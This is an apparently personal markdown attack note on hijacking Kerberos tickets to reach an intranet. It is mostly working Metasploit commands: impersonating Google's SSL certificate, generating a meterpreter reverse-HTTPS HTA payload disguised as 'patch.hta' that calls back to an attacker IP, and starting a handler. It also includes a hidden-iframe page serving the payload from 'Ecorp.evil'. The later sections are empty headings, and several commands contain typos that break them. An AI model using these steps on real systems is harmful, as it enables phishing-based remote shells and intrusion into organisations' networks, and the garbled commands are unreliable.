# Hijacking Kerberose Tickets
> Jacking kerberos tickets to remotely access the intranet.
> The noted describe a process that is run from Kali

1. Attacker creates a web page seving a malicous HTA file
2. Target browses the attacker-sent web page & executes the served HTA file
3. Meterpreter session is established
4. Malicous Code Injection
	- A: PowerShell script for recon against browser is injected into the target workstation's memory.
	- B: gssapu-proxy is dropped and executed.  The attacker can connect to port 8080 & browse the intranet, hijacking the target's active Kerberose tickets.


## 1. Malicous HTA File

1. Craft Malicous HTA File

```bash
service postgressql start
msfconsole

# MSF

msf5 use auxilary/gather/impersonate_ssl
msf5 auxilary(mpersonste_ssl)> set RHOST www.google.com
msf5 auxilary(mpersonste_ssl)> run
```

The output of *run* will include a `[+] www.google.com:443 - pem: /location/to/pem.pem`.

```bash
# MSF
msf5 auxilary(mpersonste_ssl)> use payload/windows/meterpreter/reverse_https
msf5 payload(windows/meterpreter/reverse_https)> set LHOST [evil external IP]
msf5 payload(windows/meterpreter/reverse_https)> set LPORT 443
msf5 payload(windows/meterpreter/reverse_https)> set stagerverifysslcert true
msf5 payload(windows/meterpreter/reverse_https)> set HANDLERSSLCERT /location/to/pem.pem
msf5 payload(windows/meterpreter/reverse_https)> generate -f hta-psh -o /tmp/patch.hta  #See Note Below
msf5 payload(windows/meterpreter/reverse_https)> back
msf5 use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_https
msf5 exploit(multi/handler) > set LHOST [external OR internal IP depending on the setup]
msf5 exploit(multi/handler) > set LPORT 443
msf5 exploit(multi/handler) > set stagerverifysslcert  true
msf5 exploit(multi/handler) > set HANDLERSSLCERT /location/to/pem.pem
msf5 exploit(multi/handler) > set exitonsession false
msf5 exploit(multi/handler) > exploit -j
```

**generate** Note: This could throw an error depending on the version of MSF you are using.
Older versions of msf use slightly different option flags.  Check the options for your version.

This may work instead: `generate -t hta-psh -f /tmp/patch.hta`

The `-t` was for output format but in `msf5>` it is `-f`

The `-f` was for output filename but in `msf5>` it is `-o`

**[+] Simple HTML page** to server the HTA file just created
```html
<html>
<head>
<body>
<div style="display:none;">
	<iframe id="frmDld" src:"http://Ecorp.evil/patch.hta"></iframe>
</div>
</body>
</head>
</html>
```



## 2. HTA File is Executed


## 3. Meterpreter Session


## 4. Malicous Code Injection